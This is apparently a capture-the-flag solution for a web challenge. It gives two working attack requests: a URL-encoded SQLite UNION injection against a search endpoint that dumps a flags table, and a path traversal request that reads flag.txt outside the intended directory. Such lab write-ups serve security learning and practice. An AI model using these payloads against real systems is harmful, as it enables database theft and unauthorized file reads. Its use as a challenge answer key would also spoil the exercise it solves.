# Solution

SQLite Injection & Path Traversal

- Get the first flag part:
GET /users/search?query=a'%20union%20all%20select%20group_concat(flag)%2c2%20from%20flags%3b--

- Get the second flag part:
GET /mail/../flag.txt
